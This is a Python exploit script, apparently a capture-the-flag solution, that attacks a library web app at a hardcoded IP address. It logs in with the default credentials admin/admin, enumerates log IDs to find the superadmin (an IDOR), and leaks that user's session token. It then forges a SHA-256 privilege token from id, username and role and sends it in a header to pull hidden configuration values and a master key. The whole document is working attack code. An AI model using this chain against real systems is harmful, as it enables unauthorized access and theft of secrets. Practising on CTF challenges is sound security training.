#!/usr/bin/env python3
import requests
import hashlib

BASE_URL = "http://160.25.222.15:8080"
session = requests.Session()

print("=" * 70)
print("FLAG 9: Session Manipulation & Privilege Escalation")
print("=" * 70)

# Stage 1: Login
print("\n[Stage 1] Logging in as librarian_admin...")
r = session.post(f"{BASE_URL}/backend/auth.php?action=login",
                 json={"username": "librarian_admin", "password": "admin"})
if not r.json()['success']:
    print("❌ Login failed!")
    exit(1)
print("✓ Login successful")

# Stage 2: Attempt to access hidden configs (will fail)
print("\n[Stage 2] Attempting to access hidden configs...")
r = session.get(f"{BASE_URL}/backend/admin.php?action=config&show_hidden=true")
result = r.json()
print(f"Response: {result['message']}")
print(f"Hint: {result.get('hint', 'No hint')}")

# Stage 3: IDOR to find superadmin user_id (from FLAG 8)
print("\n[Stage 3] Finding superadmin user via IDOR...")
superadmin_id = None
for log_id in range(1, 60):
    r = session.get(f"{BASE_URL}/backend/admin.php?action=logs&log_id={log_id}")
    if r.json().get('success'):
        log = r.json()['data']
        if log['username'] == 'superadmin':
            superadmin_id = log['admin_id']
            print(f"✓ Found superadmin user_id: {superadmin_id}")
            break

if not superadmin_id:
    print("❌ Could not find superadmin!")
    exit(1)

# Stage 4: Session info disclosure
print("\n[Stage 4] Exploiting session info disclosure...")
r = session.get(f"{BASE_URL}/backend/admin.php?action=user_session&user_id={superadmin_id}")
if not r.json()['success']:
    print("❌ Could not get session info!")
    exit(1)

superadmin_data = r.json()['data']
print(f"✓ Leaked superadmin info:")
print(f"  - username: {superadmin_data['username']}")
print(f"  - role: {superadmin_data['role']}")
print(f"  - session_token: {superadmin_data['session_token'][:32]}...")

# Stage 5: Token analysis and forging
print("\n[Stage 5] Analyzing and forging privilege token...")
user_id = str(superadmin_data['user_id'])
username = superadmin_data['username']
role = superadmin_data['role']

# Calculate token
forged_token = hashlib.sha256(f"{user_id}{username}{role}".encode()).hexdigest()
print(f"✓ Forged token: {forged_token[:32]}...")

# Verify token matches leaked one
if forged_token == superadmin_data['session_token']:
    print("✓ Token calculation CORRECT!")
else:
    print("❌ Token mismatch! Need to adjust calculation...")
    exit(1)

# Stage 6: Access hidden configs with forged token
print("\n[Stage 6] Accessing hidden configs with forged privilege token...")
headers = {'X-Privilege-Token': forged_token}
r = session.get(f"{BASE_URL}/backend/admin.php?action=config&show_hidden=true",
                headers=headers)

if not r.json()['success']:
    print(f"❌ Access denied: {r.json()['message']}")
    exit(1)

configs = r.json()['data']
print(f"✓ Access granted! Retrieved {len(configs)} configurations")

# Find master_key
print("\n[Final] Searching for master_key...")
for config in configs:
    if config['config_key'] == 'master_key':
        print("\n" + "=" * 70)
        print("🎉 FLAG 9 FOUND!")
        print("=" * 70)
        print(f"Config: {config['config_key']}")
        print(f"Value: {config['config_value']}")
        print(f"Description: {config['description']}")
        print("=" * 70)
        print(f"\nAnswer: {config['config_value']}")
        print("=" * 70)
        break
else:
    print("❌ master_key not found in configs!")

print("\n✅ Challenge completed!")
